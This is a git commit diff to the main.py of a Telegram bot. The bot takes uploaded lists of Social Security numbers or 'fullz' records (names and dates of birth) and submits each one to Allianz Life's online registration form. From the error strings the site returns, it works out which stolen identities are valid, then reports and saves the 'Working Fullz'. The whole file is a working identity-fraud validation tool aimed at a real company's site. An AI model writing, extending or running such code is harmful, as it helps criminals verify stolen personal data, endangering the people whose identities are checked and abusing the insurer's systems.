2e282998853564fbc554a189a30c968c4ae07aca
jakesmith112000 <92072888+jakesmith112000@users.noreply.github.com>
2024-04-11 14:15:45 -0400

    Update main.py

--- main.py
+++ main.py
@@ -10,7 +10,7 @@ admins = [1971995086,1396561970]
 
 
 
-def check_ssn(ssn:int):
+def check_ssn(ssn:int,full_ssn = False,full = [],pattern = 1,recheck = True):
     url = "https://www.allianzlife.com/Registration/individual"
     session = Session()
     resp = session.get(url)
@@ -48,9 +48,38 @@ def check_ssn(ssn:int):
         ,"IndividualIdProofing.DateOfBirthYear":"2003"
         ,"chimeraRegisteredPageData":{"pageId":page_id}
     }
-    response = session.post("https://www.allianzlife.com/SPA/Registration/Handle", json=data , headers= headers)
-    if "Show error message" in response.text: return False
-    return True
+    if full_ssn == False:
+        response = session.post("https://www.allianzlife.com/SPA/Registration/Handle", json=data , headers= headers)
+        if "Show error message" in response.text: return False
+        return True
+    else:
+        data["IndividualIdProofing.LastName"] = full[0]
+        if pattern == 2:
+            data["IndividualIdProofing.MiddleInitial"] = full[1]
+            full.pop(1)
+        data["IndividualIdProofing.FirstName"] = full[1]
+        data["IndividualIdProofing.DateOfBirthMonth"] = full[3]
+        data["IndividualIdProofing.DateOfBirthDay"] = full[4]
+        data["IndividualIdProofing.DateOfBirthYear"] = full[5]
+        response = session.post("https://www.allianzlife.com/SPA/Registration/Handle", json=data , headers= headers)
+        if "fail-existing-account-found" in response.text or not ( "fail-data-mismatch" in response.text or "Show error message" in response.text or "Error" in response.text) :
+            return True
+        else:
+            if recheck : return False
+            else:
+                full[0],full[1] = full[1],full[0]
+                return check_ssn(ssn,full_ssn,full,True)
+        
+def check_format(ssn:str):
+    pattern = r'^([^,]+),([^,]+),(\d+),(\d+),(\d+),(\d+)$'
+    second_pattern = r'^([^,]+),([^,]+),([^,]+),(\d+),(\d+),(\d+),(\d+)$'
+    if ssn.isdecimal():
+        return 0
+    elif re.match(pattern,ssn):
+        return 1
+    elif re.match(second_pattern,ssn):
+        return 2
+    else : return -1 #ignore
 
     
 def save_ssn(ssn:int,name):
@@ -58,7 +87,7 @@ def save_ssn(ssn:int,name):
 
 
 def send_telegam(ssn:int,telegram_id:int):
-    bot.send_message(telegram_id,f"NEW Working SSN : {ssn}")
+    bot.send_message(telegram_id,f"NEW Working Fullz : {ssn}")
 
 
 @bot.message_handler(content_types=['document'])
@@ -75,16 +104,23 @@ def doc_handler(message):
         bot.send_message(message.chat.id,"Successfully Received SSN File")
         bot.send_message(message.chat.id,f"Checking 🕐... ID : {name}")
         for ssn in SSNs:
-            if check_ssn(ssn):
-                successful += 1
-                send_telegam(ssn,message.chat.id)
-                save_ssn(ssn,name)
-
+            format_ = check_format(ssn)
+            if format_ == 0:
+                if check_ssn(ssn):
+                    successful += 1
+                    send_telegam(ssn,message.chat.id)
+                    save_ssn(ssn,name)
+            elif format_ == 1:
+                ssn_ = ssn.split(",")
+                if check_ssn(ssn_[2],True,ssn_):
+                    successful += 1
+                    send_telegam(ssn,message.chat.id)
+                    save_ssn(ssn,name)
     try:
         file = open(f"succ-{name}.txt","r")
         bot.send_document(message.chat.id,document = file)
         bot.send_message(message.chat.id,"Done Checking ")
         bot.send_message(message.chat.id,f"Success : {successful}")
     except:
-        bot.send_message(message.chat.id, "Done ")
+        bot.send_message(message.chat.id,"DONE")
 bot.polling()
